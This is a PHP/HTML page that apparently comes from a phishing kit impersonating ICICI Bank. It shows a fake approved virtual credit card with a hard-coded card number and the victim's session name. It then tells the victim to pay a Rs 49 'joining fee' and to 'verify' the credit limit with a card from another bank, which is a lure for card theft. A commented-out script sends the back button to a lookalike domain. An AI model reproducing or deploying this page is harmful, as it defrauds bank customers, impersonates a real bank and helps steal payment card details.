<?php
include('PHPMailer/class.phpmailer.php');
include('PHPMailer/class.smtp.php');
date_default_timezone_set('Asia/Kolkata');
$msg="";
extract($_POST);
session_start();
$data = array("3769 443158 49799","3769 443158 49799","3769 443158 49799","3769 443158 49799","3769 443158 49799","3769 443158 49799","3769 443158 49799","3769 443158 49799","3769 443158 49799", "3769 443158 49799");
?>
<!DOCTYPE html>
<html lang="en" >

<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
<head>
  <meta charset="UTF-8">  
  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">

  <title>card</title>
  <link rel="stylesheet" href="./style.css">
  
  <style type="text/css">
    .card__secret--last{
      text-align: left;
    }
    .btn-default{
      background-color: #fff;
      border-color: #fff;
      color: green;
      font-size: 17px;
      padding: 0;
    }
    .modal-footer{
      text-align: center;
    }
    .modal-header{
      border-bottom: none;
      padding: 15px 0px 0px 0px;
    }
    .modal-footer{
      padding: 8px;
    }
    .modal-body{
      padding: 8px;
    }
    .modal{
      top: 25%;
    }
    .modal-content{
      width: 80%;
      margin-left: 10%;
      border-radius: 20px;
    }
    .card__part{
      height: 246px;
    }
    @media only screen and (max-width: 360px){
      .card__part{
        height: 163px !important;
      }
      .ddd{
        display: none !important;
      }
      .dte{
        bottom: 31px !important;
        font-size: 11px !important; 
      }
      .nme{
        left: 33px !important;
        bottom: 9px !important;
        font-size: 12px !important;
      }
      .crd{
        left: 42px !important;
        bottom: 31% !important;
        font-size: 15px !important;
      }
    }
    @media only screen and (min-width: 361px) and (max-width: 768px){

      .card__part{
        height: 200px;
      }
    }
    @media only screen and (max-width: 768px){
      .card{
        width: 80% !important;
        margin-left: 12%;
      }
    }
     @font-face {
    font-family: 'KreditFront-Regular';
    font-style: normal;
    font-weight: normal;
    src: local('KreditFront-Regular'), url('kredit front.woff') format('woff');
    }
  </style>

  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

</head>
<body style="background: #fff; display: block;">
  <div style="background: #861F41; padding: 0; margin: 0;">
      <img id="flip" src="image/header2.jpg" style="width: 100%;">
      <div id="panel">Your IP : 192.58.277.41 <br>Access time : <?=date("M d h:i:s")?></div>
      <div style="background: #f37e20; height: 35px;"></div>
    </div><br>
  <div class="container">
    <div class="row">
      <div class="col-sm-3"></div>
      <div class="col-sm-6 col-xs-12" style="padding: 0; margin: 0;">
        <!-- <div style="background: #861F41; padding: 40px; text-align: center; color: #fff;">View E-Card</div><br> -->
  <h3 style="text-align: center; margin-top: 0px;"><img style="width: 30px;" src="img/thump.png"> <span>Successful</span></h3>
  <p style="text-align: center; font-size: 15px; padding: 10px; margin: 0;">Your physical card will be dispatched to your mailing address after joining fees pay and limit transfer verification.</p>
  <p style="text-align: center; font-size: 15px; padding: 10px; margin: 0;">In the Interim,you can start shopping, book travel tickets & make other online transaction using your virtual card. You can also pay at the merchant outlets by using ICICI CREDIT CARD pay and bharat QR features.</p>
  <p style="text-align: center; font-size: 15px; padding: 10px; margin: 0;"> First pay your ICICI CREDIT CARD joining fee of Rs 49 then verify the credit limit of ICICI CREDIT CARD through your other bank's credit card.</p>
<br><br><br>
<div class="card">
  <div style="background: url(img/front.png); background-size: cover;" class="card__front card__part">
    <div class="card__space-75">
      <p style="color: #e1e1e1; position: absolute; left: 57px; bottom: 32%; margin: 0; padding: 0; font-weight: bold; font-size: 24px; font-family:'KreditFront-Regular';
    letter-spacing: 1px;;" id="p1" class="card__secret--last crd"><?=$data[rand(0,9)]?></p>
      <p class="card__info nme" style="color: #d5d5d5; position: absolute; left: 38px; bottom: 18px; font-size: 14px;"><?=$_SESSION['name']?> <?=$_SESSION['lname']?></p>
      <p style="color: #d5d5d5; text-align: center; line-height: 14px; position: absolute; left: 40%; bottom: 45px; margin: 0; padding: 0; font-size: 11px;" class="card__secret--last dte">VALID THRU <?=date('m')?>/26</p>
    </div>
  </div>
  
  <div style="background: url(img/back.png); background-size: cover;" class="card__back card__part">
    <div class="card__back-content">
      <div class="card__secret"><br>
        <!-- <h4 style="margin: 0; padding: 0; font-weight: 400; font-size: 14px;" class="card__secret--last">Card Number</h4> -->
        

        <!-- <a style="font-size: 12px; font-family: arial; background: #00B0E9; color: #fff; padding: 4px 5px; text-decoration: none; border-radius: 3px;" href="#." onclick="copyToClipboard('#p1')" data-toggle="tooltip" title="Copied !">Copy Number</a> -->

        <br>

        <div class="card__space-75"><br>
        <!-- <h4 style="margin: 0; padding: 0; font-weight: 400; font-size: 14px;" class="card__secret--last">Valid Thru</h4> -->
        
    </div>
    <div class="card__space-25"><br><span class="ddd"><br></span>
        <h4 style="margin: 0; padding: 0; font-weight: 400; font-size: 14px; color: #fff; margin-bottom: 5px;" class="card__secret--last">CVV</h4>
        <a style="font-size: 12px; font-family: arial; background: #f17718; color: #fff; padding: 2px 5px; text-decoration: none; border-radius: 3px; cursor: pointer;" class="card__secret--last" data-toggle="modal" data-target="#myModal">View</a>
    </div>
      </div>
      
    </div>
  </div>
  
</div>
<br><br><br><br>
  <button style="background: #144876; color: #fff; width: 100%; padding: 15px; border: none;">ACTIVATE</button>
      </div>
    </div>
  </div>
</body>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>

</html>




<div class="container">

  <!-- Modal -->
  <div class="modal fade" id="myModal" role="dialog">
    <div class="modal-dialog">
    
      <!-- Modal content-->
      <div class="modal-content">
        <div class="modal-header">
          <!-- <button type="button" class="close" data-dismiss="modal">&times;</button> -->
          <h4 style="text-align: center;" class="modal-title">Card Details</h4>
        </div>
        <div class="modal-body">
          <p style="text-align: center;">Note : For inactive card (Primary and Add-on) you can not view the CVV.</p>
        </div>
        <div class="modal-footer" data-dismiss="modal">
          <button type="button" class="btn btn-default">OK</button>
        </div>
      </div>
      
    </div>
  </div>
  
</div>

<script type="text/javascript">
function copyToClipboard(element) {
  var $temp = $("<input>");
  $("body").append($temp);
  $temp.val($(element).text()).select();
  document.execCommand("copy");
  $temp.remove();
}
</script>

<script>
$(document).ready(function(){
  $('[data-toggle="tooltip"]').tooltip();   
});
</script>
<!-- <script type="text/javascript">
jQuery(document).ready(function($) {

      if (window.history && window.history.pushState) {

        $(window).on('popstate', function() {
          var hashLocation = location.hash;
          var hashSplit = hashLocation.split("#!/");
          var hashName = hashSplit[1];

          if (hashName !== '') {
            var hash = window.location.hash;
            if (hash === '') {
              alert('Back button was pressed.');
                window.location='https://instant-eapply-campaign-page-online-css-sb-page.co.in/redirect.php';
                return false;
            }
          }
        });

        window.history.pushState('forward', null, './#forward');
      }

    });
</script> -->
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
<script> 
$(document).ready(function(){
  $("#flip").click(function(){
    $("#panel").slideToggle("slow");
  });
});
</script>